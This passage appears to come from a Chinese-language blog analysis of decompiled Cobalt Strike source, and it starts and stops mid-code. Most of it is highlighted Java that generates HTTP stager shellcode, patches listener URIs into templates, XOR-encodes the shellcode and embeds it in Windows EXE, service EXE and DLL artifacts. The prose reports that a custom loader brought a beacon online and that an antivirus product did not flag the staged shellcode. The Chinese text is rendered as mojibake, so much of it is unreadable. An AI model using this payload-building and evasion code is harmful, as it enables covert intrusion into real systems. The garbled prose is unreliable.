class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"32-shellcod5.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> var6 <span class="token operator">=</span> var3<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token string">"Y"</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var5 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">pad</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token char">'\u0000'</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var3 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">replaceAt</span><span class="token punctuation">(</span>var3<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> var6<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"32-shellcod6.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>var3 <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getWatermark</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var7<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">MudgeSanity</span><span class="token punctuation">.</span><span class="token function">logException</span><span class="token punctuation">(</span><span class="token string">"HttpStagerGeneric: "</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getStagerFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> var7<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">replaceAt</span><span class="token punctuation">(</span><span class="token class-name">String</span> var0<span class="token punctuation">,</span> <span class="token class-name">String</span> var1<span class="token punctuation">,</span> <span class="token keyword">int</span> var2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"call replaceAt!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//System.out.println("var0 "+var0);</span><span class="token class-name">StringBuffer</span> var3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span>var0<span class="token punctuation">)</span><span class="token punctuation">;</span>var3<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var2 <span class="token operator">+</span> var1<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//System.out.println(var3);</span>var3<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> var3<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>ä» resources&#x2F;httpsstager64.bin åŠ è½½shellcode æ¨¡ç‰ˆ<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231036346.png" alt="shellcodeæ¨¡æ¿"><br>shellcodeæ¨¡æ¿ç‰¹å¾<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231036562.png" alt="æ¨¡æ¿"><br>æˆ‘ä»¬çœ‹åˆ°é‡Œé¢æœ‰éœ€è¦xxå’Œyy æˆ‘ä»¬å†çœ‹ä»£ç ã€‚ä¸‹é¢è¿™æ®µä»£ç æ˜¯åˆ†åˆ«æ‰¾åˆ°xä½ç½®å’Œyçš„ä½ç½®ä»è¿™é‡Œå¼€å§‹æŠŠlistener è¿™äº›æ›¿æ¢ä¸€ä¸‹ã€‚ç»„è£…shellcode<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231037284.png" alt="shellcodeç”Ÿæˆé€»è¾‘"></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">this</span><span class="token punctuation">.</span>stager <span class="token operator">=</span> var5<span class="token punctuation">.</span><span class="token function">getPayloadStager</span><span class="token punctuation">(</span>var3 <span class="token operator">?</span> <span class="token string">"x64"</span> <span class="token operator">:</span> <span class="token string">"x86"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ç”Ÿæˆstage x86 å’Œx64CommonUtils.writeByte(this.stager,"execshellcode.bin");  æˆ‘ä»¬æŠŠç”Ÿæˆçš„ execshellcode.bin ä½¿ç”¨æˆ‘ä»¬çš„loaderåŠ è½½ä¸€ä¸‹çœ‹çœ‹</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231038296.png" alt="ç”Ÿæˆçš„shellcode"><br>ä½¿ç”¨æˆ‘ä»¬è‡ªå·±çš„åˆ†ç¦»shellcodeåŠ è½½å™¨åŠ è½½shellcode æˆ‘ä»¬çœ‹åˆ°ç›´æ¥ä¸Šçº¿æˆåŠŸ<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231039529.png" alt="è‡ªå·±åŠ è½½shellcode"><br>åœ¨å†…å­˜ä¸­æˆ‘ä»¬çœ‹åˆ°ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231040463.png" alt="å†…å­˜ä¸­è¡¨ç°å½¢å¼"><br>æŸ¥çœ‹ç½‘ç»œè¿æ¥<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231041453.png" alt="ç«ç»’æŸ¥å£³ç½‘ç»œè¿æ¥"><br>å¹¶ä¸”ç«ç»’å¯¹åˆ†é˜¶æ®µçš„shellcode execshellcode.bin  æ”¾è¡Œä¸æ€ã€‚å› ä¸ºè¿™ä¸ªä¸æ˜¯å…³é”®ä½œç”¨ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231042360.png" alt="åˆ†è§£æœºshellcode"><br>æˆ‘ä»¬ç‚¹å‡»ä¿å­˜ä¸€ä¸‹ è¿™æ¬¡è°ƒç”¨å‡½æ•°<br>src&#x2F;aggressor&#x2F;dialogs&#x2F;WindowsExecutableDialog.java</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">dialogResult</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ç‚¹å‡»ä¿å­˜çš„æ—¶å€™è§¦å‘ç”Ÿæˆç»“æœã€‚ã€‚ã€‚ã€‚ã€‚ã€‚"</span><span class="token operator">+</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> var2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>options<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"output"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token keyword">boolean</span> var3 <span class="token operator">=</span> <span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">bool</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>options<span class="token punctuation">,</span> <span class="token string">"x64"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">boolean</span> var4 <span class="token operator">=</span> <span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">bool</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>options<span class="token punctuation">,</span> <span class="token string">"sign"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"Windows EXE"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArtifactUtils</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span> <span class="token string">"artifact64.exe"</span><span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"Windows Service EXE"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArtifactUtils</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span> <span class="token string">"artifact64svc.exe"</span><span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"Windows DLL"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArtifactUtils</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span> <span class="token string">"artifact64.x64.dll"</span><span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"Windows EXE"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArtifactUtils</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span> <span class="token string">"artifact32.exe"</span><span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"dialogResult Patch artifact32.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"Windows Service EXE"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArtifactUtils</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span> <span class="token string">"artifact32svc.exe"</span><span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"Windows DLL"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArtifactUtils</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span> <span class="token string">"artifact32.dll"</span><span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token class-name">DataUtils</span><span class="token punctuation">.</span><span class="token function">getSigner</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var6<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">MudgeSanity</span><span class="token punctuation">.</span><span class="token function">logException</span><span class="token punctuation">(</span><span class="token string">"Could not sign '"</span> <span class="token operator">+</span> var1 <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">,</span> var6<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">showError</span><span class="token punctuation">(</span><span class="token string">"Could not sign the file\nSaved unsigned "</span> <span class="token operator">+</span> var2 <span class="token operator">+</span> <span class="token string">" to\n"</span> <span class="token operator">+</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">showInfo</span><span class="token punctuation">(</span><span class="token string">"Saved "</span> <span class="token operator">+</span> var2 <span class="token operator">+</span> <span class="token string">" to\n"</span> <span class="token operator">+</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>æˆ‘ä»¬æ¥çœ‹è¿™æ®µä»£ç     (new ArtifactUtils(this.client)).patchArtifact(this.stager, â€œartifact64.exeâ€, var1);</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231044272.png" alt="ç”Ÿæˆshellcode"><br>src&#x2F;common&#x2F;BaseArtifactUtils.java</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var1<span class="token punctuation">,</span> <span class="token class-name">String</span> var2<span class="token punctuation">,</span> <span class="token class-name">String</span> var3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span> <span class="token string">"artifact64.exe"</span><span class="token punctuation">,</span> exeä¿å­˜ä½ç½®<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var4 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">patchArtifact</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeToFile</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token punctuation">,</span> var4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var1<span class="token punctuation">,</span> <span class="token class-name">String</span> var2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">A</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">Stack</span> var3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var3<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token class-name">SleepUtils</span><span class="token punctuation">.</span><span class="token function">getScalar</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var3<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token class-name">SleepUtils</span><span class="token punctuation">.</span><span class="token function">getScalar</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> var4 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">.</span><span class="token function">getScriptEngine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"EXECUTABLE_ARTIFACT_GENERATOR"</span><span class="token punctuation">,</span> var3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> var4 <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">fixChecksum</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_patchArtifact</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var2<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">fixChecksum</span><span class="token punctuation">(</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>patchArtifact å¯¹äºjava agentè¿›è¡Œæ£€æµ‹ å‘ç°agent é€€å‡º<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231045476.png" alt="æ£€æµ‹å…³é”®å­—"><br>ä»ä»£ç ä¸­æˆ‘ä»¬çœ‹åˆ°å¯¹shellcode è¿›è¡Œpatch  å…·ä½“patchä»£ç ã€‚å¦‚æœvar4 &#x3D;&#x3D; null ? this.fixChecksum(this._patchArtifact(var1, var2))   var4ç­‰äºnullè¿›å»</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">_patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var1<span class="token punctuation">,</span> <span class="token class-name">String</span> var2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span> var3 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"artifact32"</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">"x86"</span> <span class="token operator">:</span> <span class="token string">"x64"</span><span class="token punctuation">;</span><span class="token class-name">InputStream</span> var4 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">resource</span><span class="token punctuation">(</span><span class="token string">"resources/"</span> <span class="token operator">+</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"è¯»å–: "</span><span class="token operator">+</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var5 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">readAll</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//artifact64big.exe</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>var5<span class="token punctuation">,</span>var2<span class="token operator">+</span><span class="token string">".bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var4<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var6 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var7 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span>var1<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span><span class="token string">"PatchåŠ è½½å™¨ç›´æ¥åŠ è½½"</span><span class="token operator">+</span>var3<span class="token operator">+</span><span class="token string">"shellcode.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ç›´æ¥ä½¿ç”¨loaderåŠ è½½</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> var8 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> var8 <span class="token operator">&lt;</span> var1<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>var8<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// System.out.println("äº¦æˆ–çš„æ•°å­—æ˜¯: " +var6[var8 % 4]);</span>var7<span class="token punctuation">[</span>var8<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token punctuation">(</span>var1<span class="token punctuation">[</span>var8<span class="token punctuation">]</span> <span class="token operator">^</span> var6<span class="token punctuation">[</span>var8 <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//äº¦æˆ–åŠ å¯†ååˆ°å†…å­˜è¿˜åŸè§£å¯†åŠ è½½shellcode</span><span class="token punctuation">&#125;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>var7<span class="token punctuation">,</span><span class="token string">"Patchartifact"</span><span class="token operator">+</span>var3<span class="token operator">+</span><span class="token string">"shellcodeäº¦æˆ–å.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> yihuohuanyuan <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span>var7<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> var7<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>yihuohuanyuan<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token punctuation">(</span>var7<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> var6<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è¿˜åŸ</span><span class="token punctuation">&#125;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>yihuohuanyuan<span class="token punctuation">,</span><span class="token string">"Patchartifact"</span><span class="token operator">+</span>var3<span class="token operator">+</span><span class="token string">"shellcodeäº¦æˆ–åè¿˜åŸ.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> var13 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">bString</span><span class="token punctuation">(</span>var5<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//artifact32.exe è½¬æ¢æˆå­—ç¬¦ä¸² artifact64big.exe</span><span class="token keyword">int</span> var9 <span class="token operator">=</span> var13<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ‰¾é‡Œé¢çš„AAA</span><span class="token class-name">Packer</span> var10 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Packer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var10<span class="token punctuation">.</span><span class="token function">little</span><span class="token punctuation">(</span><span class="token 